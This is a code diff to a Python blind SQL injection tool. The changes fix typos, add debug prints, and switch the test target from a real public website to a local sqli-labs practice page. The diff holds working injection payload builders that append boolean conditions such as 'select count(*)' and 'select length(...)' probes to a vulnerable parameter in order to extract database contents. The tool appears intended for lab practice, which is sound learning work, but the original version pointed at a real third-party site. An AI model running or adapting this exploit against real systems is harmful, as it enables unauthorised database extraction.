@@ -49,7 +49,7 @@ class Blind():
         if data is None:
             parsed = urlparse(url)
             data = parsed.query
-            url = parsed.scheme + '://' + parsed.hostname +parsed.path
+            url = parsed.scheme + '://' + parsed.netloc +parsed.path
         data = dict(parse_qsl(data,True))
         return (url, data)
 
@@ -69,10 +69,11 @@ class Blind():
 
     
     def build_get_request(self, url, params):
+        print (self.url + '?' + urllib.urlencode(params))
         return urllib2.Request(self.url + '?' + urllib.urlencode(params),None,self.headers)
     
     def make_request(self, params):
-        return self.send_request(self.build_request(self.url),params)
+        return self.send_request(self.build_request(self.url,params))
 
     def send_request(self,req):
         result = urllib2.urlopen(req)
@@ -92,8 +93,8 @@ class Blind():
         params[self.vulnerable_param] += ' and {0} {1} （select count(*) from {2})'.format(number,operator,table)
         return params
 
-    def length_params(self, operator,number, field, table, offest):
-        params = dict(self.paramas)
+    def length_params(self, operator,number, field, table, offset):
+        params = dict(self.params)
         table = ' from ' + table if table is not None else ''
         params[self.vulnerable_param] += ' and {0} {1} (select length({2}) {3} limit 1 offset {4})'.format(number, operator, field, table, offset)
         return params
@@ -140,8 +141,9 @@ class Blind():
         length = 0 
         last = 1
         while True:
-            self.echo_tring('length',last)
+            self.echo_trying('length',last)
             params =  self.length_params('>',last,field,table,index)
+            print (params)
             if self.make_request(params):
                 break
             last *= 2
@@ -265,5 +267,5 @@ class Blind():
 
 
 if __name__ == "__main__":
-    test = Blind('http://www.baidu.com/index.php?username=12','yes')
-    test.parse_params('http://www.baidu.com/index.php?username=12')
+    test = Blind('http://localhost:8888/sqli-labs/less-8/?id=1','You are in...........')
+    test.proof_of_concept()
